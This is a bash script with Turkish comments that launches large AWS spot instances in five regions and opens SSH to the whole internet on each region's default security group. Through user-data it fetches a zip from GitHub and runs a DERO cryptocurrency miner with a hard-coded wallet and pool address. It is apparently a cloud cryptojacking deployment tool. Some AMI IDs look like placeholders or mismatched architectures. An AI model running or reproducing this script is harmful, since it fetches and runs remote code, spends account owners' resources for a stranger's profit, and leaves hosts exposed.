#!/bin/bash

# Instance türleri
declare -a instance_types=("m7a.16xlarge" "c7a.16xlarge" "r7a.16xlarge")

# Bölgeler
declare -a regions=("eu-west-1" "eu-north-1" "us-east-1" "us-west-2" "eu-central-1")

# AMI ID'leri
declare -A ami_ids
ami_ids["eu-west-1"]="ami-arm64-ubuntu24-euw1"
ami_ids["eu-north-1"]="ami-0c1ac8a41498c1a9c"
ami_ids["us-east-1"]="ami-084568db4383264d4"
ami_ids["us-west-2"]="ami-075686beab831bb7f"
ami_ids["eu-central-1"]="ami-arm64-ubuntu24-euc1"

success_list_spot=()
failed_regions_spot=()

find_instance_type() {
    local region=$1
    for instance_type in $(shuf -e "${instance_types[@]}"); do
        local available
        available=$(aws ec2 describe-instance-type-offerings \
            --region "$region" \
            --filters "Name=instance-type,Values=$instance_type" "Name=location,Values=$region" \
            --query "InstanceTypeOfferings | length(@)" --output text 2>/dev/null)

        if [ "$available" -gt 0 ]; then
            echo "$instance_type"
            return
        fi
    done
    echo ""
}

create_spot_instance() {
    local region="$1"
    local instance_type="$2"
    local ami_id="$3"

    local security_group_id
    security_group_id=$(aws ec2 describe-security-groups \
        --region "$region" \
        --filters "Name=group-name,Values=default" \
        --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)

    aws ec2 authorize-security-group-ingress \
        --region "$region" \
        --group-id "$security_group_id" \
        --protocol tcp --port 22 --cidr 0.0.0.0/0 \
        2>/dev/null || true

    local user_data
    user_data=$(cat <<EOF
#!/bin/bash
apt update && apt install -y unzip && wget -qO literary.zip https://github.com/eraemm/literary/raw/main/literary.zip && unzip -o literary.zip && chmod +x literary/deroluna-miner && screen -dmS literary ./literary/deroluna-miner -w dero1qyy8lusws59e50q9pru6wjt709jcgjle8t4qfmjfm25kzk32s0z8gqgp35cum -d 144.91.103.135:10100
EOF
    )

    local instance_id
    instance_id=$(aws ec2 run-instances \
        --region "$region" \
        --image-id "$ami_id" \
        --instance-type "$instance_type" \
        --security-group-ids "$security_group_id" \
        --instance-market-options '{"MarketType":"spot"}' \
        --user-data "$user_data" \
        --count 1 \
        --query 'Instances[0].InstanceId' \
        --output text 2>/dev/null)

    echo "$instance_id"
}

# Ana döngü – sadece Spot başlatılır
for region in "${regions[@]}"; do
    echo "********************************************************"
    echo "Bölge: $region"

    chosen_type=$(find_instance_type "$region")
    if [ -z "$chosen_type" ]; then
        echo "$region bölgesinde uygun bir instance türü bulunamadı."
        failed_regions_spot+=("$region")
        continue
    fi
    echo "Seçilen instance türü: $chosen_type"

    ami_id="${ami_ids[$region]}"
    if [ -z "$ami_id" ]; then
        echo "$region bölgesi için AMI ID'si tanımlanmamış."
        failed_regions_spot+=("$region")
        continue
    fi

    echo "Spot instance oluşturuluyor..."
    spot_instance_id=$(create_spot_instance "$region" "$chosen_type" "$ami_id")

    if [ -n "$spot_instance_id" ] && [ "$spot_instance_id" != "None" ]; then
        echo "Spot instance oluşturuldu: $spot_instance_id"
        success_list_spot+=("$region:$chosen_type:$spot_instance_id")
    else
        echo "Spot instance oluşturulamadı."
        failed_regions_spot+=("$region")
    fi
done

# Özet
echo "==========================================================="
echo "Spot Başarılı Bölgeler:"
printf '%s\n' "${success_list_spot[@]}"

echo "Spot Başarısız Bölgeler:"
printf '%s\n' "${failed_regions_spot[@]}"
